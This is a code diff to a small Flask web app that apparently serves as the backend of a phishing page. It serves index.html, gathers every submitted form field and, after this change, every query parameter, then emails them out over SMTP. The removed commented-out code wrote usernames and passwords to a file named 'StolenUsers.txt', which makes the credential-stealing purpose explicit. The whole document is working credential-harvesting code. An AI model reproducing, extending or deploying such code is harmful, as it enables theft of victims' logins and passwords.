@@ -11,7 +11,7 @@ def sendMail(msg):
     port = 465  # For SSL
     password = os.getenv("PASSWORD")
     email = os.getenv("EMAIL")
-    print(email, password)
+    print(email)
 
     # Create a secure SSL context
     context = ssl.create_default_context()
@@ -29,19 +29,11 @@ def root():
         mail = ", ".join(f"{k}:{v}" for k,v in request.form.items() if v != "")
         print(mail)
         sendMail(mail)
+    elif len(request.args) > 0:
+        mail = ", ".join(f"{k}:{v}" for k,v in request.args.items() if v != "")
+        print(mail)
+        sendMail(mail)
     return send_file("./index.html")
-    
-    # username = request.args.get("username",None)
-    # password = request.args.get("password",None)
-
-
-    # print(f"username={username}\npassword={password}")
-
-    # if username != None or password !=None:
-    #     with open("StolenUsers.txt", "at", encoding="utf-8") as file:
-    #         file.write(f"User: {username}, Password: {password}\n")
-
-    # return app.send_static_file('index.html')
 
 
 if __name__ == '__main__':
